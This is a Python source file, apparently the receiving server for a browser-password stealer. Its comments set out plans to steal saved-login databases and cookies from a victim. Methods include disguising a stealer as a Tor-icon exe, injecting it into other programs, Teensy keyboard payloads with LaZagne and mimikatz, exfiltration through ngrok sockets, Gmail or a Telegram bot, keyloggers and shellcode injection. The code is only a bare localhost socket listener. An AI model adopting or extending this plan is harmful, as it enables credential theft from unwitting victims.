
# https://null-byte.wonderhowto.com/how-to/grab-all-passwords-0163301/
# https://pastebin.com/LV2XPc2R, https://pastebin.com/sd5aqTez
# use socket programming with ngrok to recv the dbs
# u can use gmail also to recv dbs after you send them to your account
# u can use telepot to send the dbs to your ICFU bot
# u can use post-exploitation in msf to steal browser passwords
# after choosing your way of doing this shity thing just make an exe file with tor icon from SnatchDB_C.py
# the only important thing for us is Login Data or logins table u can get other info such as history and cookies using Snatch.py code
'''
after you create the exe file from the SnatchDB_C.py with its tor icon upload your TOR.exe 
in somewhere so you can use it in teensy payload to grab the data as a db or
just inject your TOR.exe into another exe file then give that app.exe to the target or
just use the laZagne and mimikatz payload for bloody teensy to steal all target passwords(remember to fix the keyboard language in your payload!)
or just use it with your socket server'''

# get help from the radiumkeylogger code
# WARNING: complete this project on windows!


'''
think about all hacking ways(jab on who; see details in above msg header & use Dr0p1t framework fot all kind of backdoors; compare socket programming with msf post exploitation modules) 
think about more tips and tricks to hack using socket programming like keylogger, 
steal cookies & other files from victim machine, 
steal deleted files using a recovery app[with socket programming we can do almost anything and build smt like msf to do all these more convenient], 
upload Malware, backdoors & virus codes shellcodes on there, 
inject shellcode(send the shellcode to inject it using ctypes lib; 
see the payload.py for more details to send the payload.py using socket programming)[in all these ways u need 3 files 1) server.py 2) client.py 3) virus.exe 
which u built this virus using assembly and shellcode programming]
'''

import socket
import pickle

host = '127.0.0.1'
port = 8234

serversock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversock.bind((host, port))
serversock.listen(1)
print '[+] Server Listening On Port : ', port

conn, addr = serversock.accept()
print '[+] Connected by => : ', addr












